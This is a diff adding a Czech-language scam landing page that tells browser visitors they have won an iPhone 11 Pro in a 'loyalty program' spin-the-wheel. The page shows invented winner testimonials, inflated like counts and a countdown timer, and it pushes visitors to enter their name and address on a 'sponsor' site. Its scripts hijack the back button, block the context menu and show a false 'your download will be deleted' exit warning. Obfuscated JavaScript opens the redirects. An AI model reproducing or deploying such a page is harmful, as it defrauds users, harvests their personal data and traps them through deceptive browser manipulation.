@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="cs">
+
+<head>
+	<base href="">
+	<base ""="">
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+	<meta name="robots" content="noindex, nofollow, noarchive">
+	<meta name="referrer" content="no-referrer">
+	<meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+	<title>Gratulujeme!</title>
+	<meta content="notranslate" name="google">
+	<script>
+	function getURLParameter(c) {
+		c = c.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+		var b = new RegExp("[\\?&]" + c + "=([^&#]*)").exec(location.search);
+		return null === b ? "" : decodeURIComponent(b[1].replace(/\+/g, " "))
+	}
+
+	function dateOffset(f, c) {
+		var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
+			h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
+		1 == b && (f = 0);
+		var d = ["Neděle", "Pondělí", "Úterý", "Středa", "Čtvrtek", "Pátek", "Sobota"],
+			g = ["Ledna", "Února", "Března", "Dubna", "Května", "Června", "Července", "Srpna", "Září", "Října", "Listopadu", "Prosince"];
+		return null != !c && 0 != !c && void 0 != !c ? h.getDate() + ". " + g[h.getMonth()] : "day_name_only" == c && b ? d[h.getDay()] : "top_date" == c && b ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear() : void 0
+	}! function() {
+		var a;
+		try {
+			for(a = 0; 10 > a; ++a) {
+				history.pushState({}, "", "#")
+			}
+			onpopstate = function(b) {
+				b.state && location.replace("#")
+			}
+		} catch(a) {}
+	}();
+	</script>
+	<link href="css/clean.css" rel="stylesheet">
+	<script async="" src="js/api.js"></script>
+</head>
+
+<body oncontextmenu="return!1" onload="setButtonHeight(),autospin1()">
+	<script>
+	var names = ["Béres Róbert", "Fenyvesi Neci", "Szegedi Ugor", "Szûcs Zsofika", "Takách Rozalia", "Kontz Elizabet", "Schmit Tardos"];
+	</script>
+	<div id="header"> <span class="menu"></span>
+		<h3><span id="headline">LOYALTY PROGRAM</span></h3> <img alt="Smiley face" src="images/v.png" width="15" height="15" style="margin:-2px 0"><span class="icon"></span> </div>
+	<div id="container">
+		<div align="center" id="firstpage">
+			<div class="date" id="topDate" style="padding-bottom:10px;margin:0">
+				<script>
+				document.write(dateOffset(0, "top_date"));
+				</script>Čtvrtek, 2 Července 2020 </div>
+			<div style="margin-bottom:2px">
+				<div id="subheadline">
+					<p style="font-size:18px"><b>Gratulujeme!</b>
+					</p>
+					<p style="padding-top:10px">Dnes máte štěstí!</p>
+				</div>
+				<div class="intro" style="padding-top:5px"> Každou <span id="today"><script>document.write(dateOffset(0,"day_name_only"));</script>Čtvrtek</span> vybereme 7 uživatelů prohlížeče
+					<script>
+					document.write(getURLParameter("browser_name"));
+					</script>Samsung Browser , abychom jim poskytli příležitost získat ceny od našich sponzorů. Otočte kolečkem a zjistěte, kterou cenu dostanete! </div>
+				<div id="wheelCon"> <img class="spinAround2 transparent" height="501" id="wheel" src="images/pw_i11.png" width="501">
+					<input id="pressButton" onclick="spin()" style="top: 106.2px;" type="button">
+					<div><img class="animated rotateIn" id="devMockup" src="images/i11o.png" style="display: block; left: 154px; top: 158px;">
+					</div>
+				</div>
+			</div>
+			<div id="secondpage">
+				<div class="congrats">
+					<h4>
+<a href="javascript:void(0)" style="cursor:pointer!important" onclick="exit_a1();PreventExitPop=false" rel="noreferrer">
+<font color="#3C5A96">Gratulujeme!<br>Máte šanci vyhrát nový iPhone 11 Pro!</font>
+</a>
+</h4> </div>
+				<div class="congrats" style="text-align:left">
+					<ol>
+						<li>Vyberte si barvu, která se vám líbí. Budete přesměrováni na webové stránky našeho sponzora</li>
+						<li>Na webové stránce zadavatele zadejte své jméno a příjmení, jakož i adresu pro doručování</li>
+						<li>Váš dar bude zaslán kurýrem na adresu, kterou jste zadali do 5 dnů</li>
+					</ol> <b>DŮLEŽITÉ:</b> Dárky se mohou kdykoli ukončit, zvolit rychleji! </div>
+				<div class="timer">Nabídka je platná po dobu <font color="red"><b><span id="mins">4</span> minut a <span id="hsecs">59</span> sekund</b></font> </div>
+				<div class="prize">
+					<table>
+						<tbody>
+							<tr>
+								<th></th>
+								<td style="padding:10px 5px 10px 0;text-align:center"><img src="images/i11-s.png" style="max-width:100px">
+								</td>
+								<td style="line-height:1.6">
+									<p style="text-align:left"><a href="javascript:void(0)" style="cursor:pointer!important" onclick="exit_a1();PreventExitPop=false" rel="noreferrer"><span class="name">iPhone 11 Pro 64GB (Stříbrný)</span></a>
+									</p>
+									<p><span class="smallfont">5,8 "displej XDR Super sítnice</span>
+									</p>
+									<p class="regular_price">Maloobchodní cena: <s class="red_text"><script>document.write(getURLParameter("pr"));</script>$1199</s>
+									</p>
+									<p class="your_price">Tvá cena: <span><script>document.write(getURLParameter("yp"));</script>$0</span>
+									</p>
+									<p class="remaining"><b>Dostupný: <span>1</span></b>
+									</p>
+									<div> <a href="#" class="button" style="cursor:pointer!important" onclick="launchext(); exit_a1();" target="_blank"> Vybrat </a> </div>
+								</td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+				<div class="prize">
+					<table>
+						<tbody>
+							<tr>
+								<th></th>
+								<td style="padding:10px 5px 10px 0;text-align:center"><img src="images/i11-g.png" style="max-width:100px">
+								</td>
+								<td style="line-height:1.6">
+									<p style="text-align:left"><a href="javascript:void(0)" style="cursor:pointer!important" onclick="exit_a1();PreventExitPop=false" rel="noreferrer"><span class="name">iPhone 11 Pro 64GB (Prostorově Šedé)</span></a>
+									</p>
+									<p><span class="smallfont">5,8 "displej XDR Super sítnice</span>
+									</p>
+									<p class="regular_price">Maloobchodní cena: <s class="red_text"><script>document.write(getURLParameter("pr"));</script>$1199</s>
+									</p>
+									<p class="your_price">Tvá cena: <span><script>document.write(getURLParameter("yp"));</script>$0</span>
+									</p>
+									<p class="remaining"><b>Dostupný: <span>3</span></b>
+									</p>
+									<div> <a href="#" class="button" style="cursor:pointer!important" onclick="launchext(); exit_a1();" target="_blank"> Vybrat </a> </div>
+								</td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+			</div>
+		</div>
+		<div class="container">
+			<div class="comments">
+				<div class="wi_like_wrap border_bottom"> <span class="like_people"><span class="like_people_images"><span class="like_people_image_wrap"><img class="like_people_image" height="24" src="images/like_user_1.jpg" width="24"></span> <span class="like_people_image_wrap"><img class="like_people_image" height="24" src="images/like_user_2.jpg" width="24"></span></span> <span class="like_people_text">1537 lidí se to líbí</span></span>
+				</div>
+				<div class="wi_buttons border_bottom">
+					<div class="wi_buttons_wrap"> <span class="like_wrap"><span class="item_like _i"><i class="i_like"></i> <b class="v_like">1537</b></span> <span class="item_share is_empty _i"><i class="i_share"></i> <b class="v_share">234</b></span></span> <span class="item_views"><i class="i_views"></i> <b class="v_views">544K</b></span> </div>
+				</div>
+				<center> <font face="arial"></font>
+					<table border="0" cellpadding="4" cellspacing="0" style="padding-top:10px;font-size:13px" width="100%">
+						<tbody id="comments_list">
+							<tr>
+								<td align="right" class="photo_avatar" valign="top" width="40"><img src="images/cz11.jpg">
+								</td>
+								<td align="left" valign="top">
+									<div class="comment_name">
+										<script>
+										document.write(names[0]);
+										</script>Béres Róbert</div>
+									<div class="comment_text">Dropped iPhone 11 Pro! Upřímně, chtěla jsem iMac, ale ne dnes ...</div>
+									<div class="comments__item__meta">
+										<div class="item_date">Včera v 08:13</div>
+									</div>
+									<div class="pi_links"> <span class="like_wrap"><span class="pi_link">Jako</span></span> <span class="pi_reply_wrap">· <span>Komentář</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div>
+								</td>
+							</tr>
+							<tr>
+								<td colspan="2">
+									<hr> </td>
+							</tr>
+							<tr>
+								<td align="right" class="photo_avatar" valign="top" width="40"><img src="images/cz12.jpg">
+								</td>
+								<td align="left" valign="top">
+									<div class="comment_name">
+										<script>
+										document.write(names[1]);
+										</script>Fenyvesi Neci</div>
+									<div class="comment_text">Vyhrál jsem 1 volnou hru, ale vyhrál jsem cenu. Mohu získat další šanci?</div>
+									<div class="comments__item__meta">
+										<div class="item_date">
+											<script>
+											document.write(dateOffset(2));
+											</script>30. Června v 16:21 </div>
+									</div>
+									<div class="pi_links"> <span class="like_wrap"><span class="pi_link">Jako</span></span> <span class="pi_reply_wrap">· <span>Komentář</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div>
+								</td>
+							</tr>
+							<tr>
+								<td colspan="2">
+									<hr> </td>
+							</tr>
+							<tr>
+								<td align="right" class="photo_avatar" valign="top" width="40"><img src="images/cz13.jpg">
+								</td>
+								<td align="left" valign="top">
+									<div class="comment_name">
+										<script>
+										document.write(names[2]);
+										</script>Szegedi Ugor</div>
+									<div class="comment_text">Právě jsem rozbalil nový iMac! To je nejlepší cena ze všech!</div>
+									<div class="comments__item__meta">
+										<div class="item_date">
+											<script>
+											document.write(dateOffset(2));
+											</script>30. Června v 15:33 </div>
+									</div>
+									<div class="pi_links"> <span class="like_wrap"><span class="pi_link">Jako</span></span> <span class="pi_reply_wrap">· <span>Komentář</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div>
+								</td>
+							</tr>
+							<tr>
+								<td colspan="2">
+									<hr> </td>
+							</tr>
+							<tr>
+								<td align="right" class="photo_avatar" valign="top" width="40"><img src="images/cz14.jpg">
+								</td>
+								<td align="left" valign="top">
+									<div class="comment_name">
+										<script>
+										document.write(names[3]);
+										</script>Szûcs Zsofika</div>
+									<div class="comment_text">Nejdřív jsem si myslel, že to byl vtip, ale dnes ráno jsem dostal nový iPhone 11 Pro, také jsem dostal tričko s logem!</div>
+									<div class="comments__item__meta">
+										<div class="item_date">
+											<script>
+											document.write(dateOffset(2));
+											</script>30. Června v 09:02 </div>
+									</div>
+									<div class="pi_links"> <span class="like_wrap"><span class="pi_link">Jako</span></span> <span class="pi_reply_wrap">· <span>Komentář</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div>
+								</td>
+							</tr>
+							<tr>
+								<td colspan="2">
+									<hr> </td>
+							</tr>
+							<tr>
+								<td align="right" class="photo_avatar" valign="top" width="40"><img src="images/cz15.jpg">
+								</td>
+								<td align="left" valign="top">
+									<div class="comment_name">
+										<script>
+										document.write(names[4]);
+										</script>Takách Rozalia</div>
+									<div class="comment_text">Můj iMac přišel dnes ráno! Miluji to!!!</div>
+									<div class="comments__item__meta">
+										<div class="item_date">
+											<script>
+											document.write(dateOffset(3));
+											</script>29. Června v 11:01 </div>
+									</div>
+									<div class="pi_links"> <span class="like_wrap"><span class="pi_link">Jako</span></span> <span class="pi_reply_wrap">· <span>Komentář</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div>
+								</td>
+							</tr>
+							<tr>
+								<td colspan="2">
+									<hr> </td>
+							</tr>
+							<tr>
+								<td align="right" class="photo_avatar" valign="top" width="40"><img src="images/cz16.jpg">
+								</td>
+								<td align="left" valign="top">
+									<div class="comment_name">
+										<script>
+										document.write(names[5]);
+										</script>Kontz Elizabet</div>
+									<div class="comment_text">Vyhrála jsem iPad. Stále nevěřím, že je to pravda!</div>
+									<div class="comments__item__meta">
+										<div class="item_date">
+											<script>
+											document.write(dateOffset(3));
+											</script>29. Června v 5:45 </div>
+									</div>
+									<div class="pi_links"> <span class="like_wrap"><span class="pi_link">Jako</span></span> <span class="pi_reply_wrap">· <span>Komentář</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div>
+								</td>
+							</tr>
+							<tr>
+								<td colspan="2">
+									<hr> </td>
+							</tr>
+							<tr>
+								<td align="right" class="photo_avatar" valign="top" width="40"><img src="images/cz17.jpg">
+								</td>
+								<td align="left" valign="top">
+									<div class="comment_name">
+										<script>
+										document.write(names[6]);
+										</script>Schmit Tardos</div>
+									<div class="comment_text">Vyhrál jsem iPad, ale už to mám, mohu změnit cenu na iMacu?</div>
+									<div class="comments__item__meta">
+										<div class="item_date">
+											<script>
+											document.write(dateOffset(4));
+											</script>28. Června v 16:47 </div>
+									</div>
+									<div class="pi_links"> <span class="like_wrap"><span class="pi_link">Jako</span></span> <span class="pi_reply_wrap">· <span>Komentář</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> </div>
+								</td>
+							</tr>
+							<tr>
+								<td colspan="2">
+									<hr> </td>
+							</tr>
+						</tbody>
+					</table>
+					<div class="show_next_wrap"> <span class="show_next">Vidět vše</span> </div>
+				</center>
+			</div>
+		</div>
+		<div class="fixed_footer"><img alt="" class="clip" src="images/clip_footer_3.png">
+			<input class="footer_input" placeholder="Vaše zpráva" type="text"> <img alt="" class="btn_send" src="images/footer_right.png">
+		</div>
+	</div>
+	<script type="text/javascript">
+	function ExitPop() {
+		if(PreventExitPop != ![]) return "If you leave the page, your downloading file will be deleted.\n\nCome back and simply download your file."
+	}
+
+	function exit_a1() {
+		window[_0x12dd("0x0")] = null
+	}
+
+	function launchext() {
+		return setTimeout(function() {
+			url = _0x1126("0x0"), document[_0x1126("0x8")][_0x1126("0x1")](url), isSafari && window[_0x1126("0x2")]("", _0x1126("0x3"))
+		}, 1e3), ![]
+	}
+	var _0x2070 = ["onbeforeunload"];
+	! function(t, n) {
+		! function(n) {
+			for(; --n;) t.push(t.shift())
+		}(++n)
+	}(_0x2070, 352);
+	var _0x5594 = function(t, n) {
+			return _0x2070[t -= 0]
+		},
+		PreventExitPop = !![];
+	window[_0x5594("0x0")] = ExitPop;
+	var _0x47c8 = ["onbeforeunload"];
+	! function(t, n) {
+		! function(n) {
+			for(; --n;) t.push(t.shift())
+		}(++n)
+	}(_0x47c8, 126);
+	var _0x12dd = function(t, n) {
+			return _0x47c8[t -= 0]
+		},
+		_0x19d6 = ["prototype", "Constructor", "indexOf", "location", "#", "assign", "open", "_blank", "HTMLElement"];
+	! function(t, n) {
+		! function(n) {
+			for(; --n;) t.push(t.shift())
+		}(++n)
+	}(_0x19d6, 310);
+	var _0x1126 = function(t, n) {
+			return _0x19d6[t -= 0]
+		},
+		isSafari = Object[_0x1126("0x5")].toString.call(window[_0x1126("0x4")])[_0x1126("0x7")](_0x1126("0x6")) > 0;
+	! function(t, n) {
+		history.replaceState(null, document.title, n.pathname + "#!/history"), history.pushState(null, document.title, n.pathname), t.addEventListener("popstate", function() {
+			"#!/history" === n.hash && (history.replaceState(null, document.title, n.pathname), setTimeout(function() {
+				n.replace("#")
+			}, 0))
+		}, !1)
+	}(window, location)
+	</script>
+	<script type="text/javascript">
+	var page = getURLParameter("page"),
+		brand = getURLParameter("device_vendor");
+	var conMid, mydate = new Date,
+		year = mydate.getFullYear(),
+		month = mydate.getMonth(),
+		day = mydate.getDate(),
+		weekday = mydate.getDay(),
+		count = 1,
+		headline = document.getElementById("headline"),
+		topDate = document.getElementById("topDate"),
+		today = document.getElementById("today"),
+		con = document.getElementById("container"),
+		whCon = document.getElementById("wheelCon"),
+		dWheel = document.getElementById("wheel"),
+		button = document.getElementById("pressButton"),
+		device = document.getElementById("devMockup"),
+		first = document.getElementById("firstpage"),
+		second = document.getElementById("secondpage");
+
+	function setButtonHeight() {
+		conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+	}
+
+	function spin() {
+		switch(count) {
+			case 1:
+				button.disabled = !0, dWheel.className = "spinAround", setTimeout(function() {
+					button.disabled = !1, alert("Máte další pokus!\n\nZkus to znovu!"), autospin2()
+				}, 6800);
+				break;
+			case 2:
+				dWheel.className = "spinAround2", setTimeout(function() {
+					dWheel.className = dWheel.className + " transparent"
+				}, 6800), setTimeout(function() {
+					device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+				}, 7000), setTimeout(function() {
+					first.innerHTML = "<img src='images/loading.gif'>", first.style.padding = "195px 0px", setTimeout(function() {
+						first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild), setInterval("countdown()", 1000)
+					}, 1500)
+				}, 9000)
+		}
+		count++
+	}
+
+	function autospin2() {
+		spin()
+	}
+
+	function autospin1() {
+		alert("Gratulujeme, uživatel " + getURLParameter("browser_name") + '!\n\nJste jedním ze 7 lidí, kteří se rozhodli pro účast na našem věrnostním programu! Můžete získat 1 dárek z 4!\n\nKlepnutím na tlačítko "OK" spustíte!'), document.getElementById("pressButton").click()
+	}
+
+	function countdown() {
+		var d = parseInt(document.getElementById("mins").innerHTML),
+			c = parseInt(document.getElementById("hsecs").innerHTML),
+			b = 0,
+			a = 0;
+		0 !== d && 0 === c ? (b = d - 1, a = 59) : 0 !== d || 0 !== c ? (b = d, a = c - 1) : 0 === d && 0 === c && (b = d, a = c), a < 10 && (a = "0" + a), document.getElementById("mins").textContent = b, document.getElementById("hsecs").textContent = a
+	};
+	</script>
+	<script type="text/javascript">
+	(function() {
+		window['__CF$cv$params'] = {
+			r: '5acb40421e790497',
+			m: '71af1e63bec84e6f657b988f5d3833b535f17403-1593723151-1800-AenpT5Ah8atOI+PHWR88W+hPXwxRBY9YGm8HhBNvZn6kKX2krjx7krjpLugpYF+ul1Ubdf5USCR2V9+zYruUzNw4y+eRpVMVIGeabMF+xHj0y54swmImwleWlkSQNtgZPd1QPRJiuGvNt+irijItTaxnL/3xdSnpAiCuy36of5OusJC/YB7Qm/VnRpCC/mmElVECHgFvL2eAK+h167HwRYqbm4nHuJPArOQuRHUSYE0M',
+			s: [0x270c8bb603, 0x09806d27ed],
+		}
+	})();
+	</script>
+</body>
+
+</html>
